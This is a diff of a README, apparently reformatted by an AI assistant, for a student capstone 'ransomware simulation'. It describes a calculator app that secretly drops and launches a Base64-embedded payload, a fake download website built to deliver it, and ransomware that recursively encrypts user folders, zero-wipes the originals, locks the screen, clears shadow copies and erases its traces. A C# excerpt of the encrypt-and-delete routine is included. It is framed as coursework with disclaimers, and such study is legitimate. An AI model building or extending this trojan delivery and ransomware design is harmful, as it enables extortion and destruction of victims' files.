@@ -1,47 +1,51 @@
+Thought for a second
 
 
+````markdown
+# Capstone Project: Ransomware Simulation & Delivery
 
-```
-# Capstone Project: Ransomware Simulation & Delivery  
-**Aimery Barrault | CSCI 460 – Capstone**
+**Author:** Aimery Barrault  
+**Course:** CSCI 460 – Capstone  
 
 ---
 
 ## 🚀 Project Overview
 
-This repository contains a ransomware simulation for controlled, educational use:
+This repository contains a controlled, educational ransomware simulation.  
+> **Warning:** Do **not** deploy on production systems or without explicit authorization.
 
-- **CalculatorApp.exe** – a benign “calculator” UI that drops and launches the real payload  
-- **capstone-site/** – Next.js “fake download” website to deliver the payload  
-- **payload.txt** & **base64script.py** – utilities to embed and extract the encrypted dropper  
-
- **Do not deploy on production systems or without explicit authorization.**
+- **CalculatorApp.exe**  
+  A benign “calculator” UI that embeds, drops, and launches the real payload.
+- **capstone-site/**  
+  A Next.js “fake download” website used to deliver the payload.
+- **payload.txt** & **base64script.py**  
+  Utilities to embed and extract the encrypted dropper.
 
 ---
 
-## ⚙️ Setting Up the Fake-Download Site
+## ⚙️ Fake-Download Site Setup
 
-1. **Enter the site directory**  
-   ```
+1. **Change into the site directory**  
+   ```bash
    cd capstone-site
 ````
 
 2. **Install dependencies**
 
-   ```
+   ```bash
    npm install
    # or
    yarn install
    ```
 
-3. **Place your payload**
+3. **Add your payload**
    Copy `CalculatorApp.exe` into:
 
    ```
    capstone-site/public/Downloads
    ```
 
-4. **Run in development**
+4. **Run in development mode**
 
    ```bash
    npm run dev
@@ -49,37 +53,41 @@ This repository contains a ransomware simulation for controlled, educational use
    yarn dev
    ```
 
-   Open [http://localhost:3000](http://localhost:3000).
-
+   Then open [http://localhost:3000](http://localhost:3000) in your browser.
 
 ---
 
 ## 🖥️ CalculatorApp (Dropper UI)
 
-**MainWindow\_CalculatorApp.cs** – WPF application that:
+**`MainWindow_CalculatorApp.cs`** — A WPF application that:
 
-* Displays a standard calculator UI.
-* On a trigger (e.g. backspace), reads Base64 string, decodes the real dropper, writes it to `%USERPROFILE%\Documents\CalculatorManager.exe`, launches it, and exits.
-
+1. Displays a standard calculator interface.
+2. On trigger (e.g. Backspace), reads a Base64-encoded string.
+3. Decodes and writes `CalculatorManager.exe` to `%USERPROFILE%\Documents\`.
+4. Launches `CalculatorManager.exe` and exits.
 
 ---
 
 ## 🔒 Ransomware Simulator
 
-**MainWindow\_Manager.cs** – WPF application that:
+**`MainWindow_Manager.cs`** — A WPF application that performs:
 
-1. **EncryptAll()** – Recursively encrypts user files under:
+1. **File Encryption**
 
-   * Desktop
-   * Documents
-   * Pictures
-   * Downloads
-   * Public Documents
-2. **AES-128 CBC** with a fresh IV per file (prepended to ciphertext)
-3. **SecureDelete()** – Overwrites original with zeroes, then deletes
-4. **Countdown Timer** – 24-hour full-screen, top-most UI lockdown
-5. **Password-protected Decrypt** – PBKDF2(SHA-256) verification, max 3 attempts
-6. **SelfDestruct()** – Clears shadow copies, zero-wipes key & flag, removes Run-key, then exits
+   * Recursively encrypts files under Desktop, Documents, Pictures, Downloads, and Public Documents.
+   * Uses AES-128 CBC with a fresh IV per file, prepended to the ciphertext.
+2. **Secure Deletion**
+
+   * Overwrites each original file with zeros, then deletes it.
+3. **Countdown Timer**
+
+   * Displays a 24-hour full-screen, top-most UI lockout.
+4. **Password-Protected Decryption**
+
+   * Verifies via PBKDF2(SHA-256), allowing up to three attempts.
+5. **Self-Destruct**
+
+   * Clears shadow copies, zero-wipes key and flag files, removes the Run-key, then exits.
 
 <details>
 <summary>Encryption code excerpt</summary>
@@ -87,10 +95,9 @@ This repository contains a ransomware simulation for controlled, educational use
 ```csharp
 private void SafeEncryptDirectory(string dir, byte[] aesKey, string self)
 {
-    // encrypt files in this folder
     string[] files;
     try { files = Directory.GetFiles(dir); }
-    catch { return; } // skip unreadable folder
+    catch { return; } 
 
     foreach (var f in files)
     {
@@ -114,7 +121,6 @@ private void SafeEncryptDirectory(string dir, byte[] aesKey, string self)
         {
             File.AppendAllText("error.log", $"ENCRYPT {f} → {ex.Message}\n");
         }
-        // securely overwrite & delete original
         SecureDelete(f);
     }
 
@@ -129,21 +135,24 @@ private void SafeEncryptDirectory(string dir, byte[] aesKey, string self)
 
 </details>
 
-
 ---
 
-## ✅ Windows Setup & Execution
+## ✅ Windows VM Execution
 
-1. Copy executables & scripts to a Windows 10 VM.
-2. Run `CalculatorApp.exe` to drop & launch `CalculatorManager.exe`.
-3. Observe `*.aes` files in Desktop/Documents/etc.
-4. Enter the correct password to decrypt.
+1. Copy `CalculatorApp.exe`, `CalculatorManager.exe`, and supporting scripts to a Windows 10 VM.
+2. Run:
+
+   ```powershell
+   .\CalculatorApp.exe
+   ```
+3. Observe `.aes` files appearing in Desktop, Documents, etc.
+4. Enter the correct password to decrypt and restore files.
 
 ---
 
 ## ⚖️ Legal Disclaimer
 
-This software is provided **as-is** for **educational purposes only**. Misuse without explicit authorization is prohibited. By using this software you agree that:
+This software is provided **as-is** for **educational purposes only**. Misuse without explicit authorization is prohibited. By using this software, you agree that:
 
 1. You are solely responsible for any damage.
 2. The author and institution assume no liability.
@@ -153,7 +162,7 @@ This software is provided **as-is** for **educational purposes only**. Misuse wi
 
 ## 📜 License
 
-MIT License. See [LICENSE.md](LICENSE.md) for full terms.
+This project is released under the MIT License. See [LICENSE.md](LICENSE.md) for full terms.
 
 ```
 ```
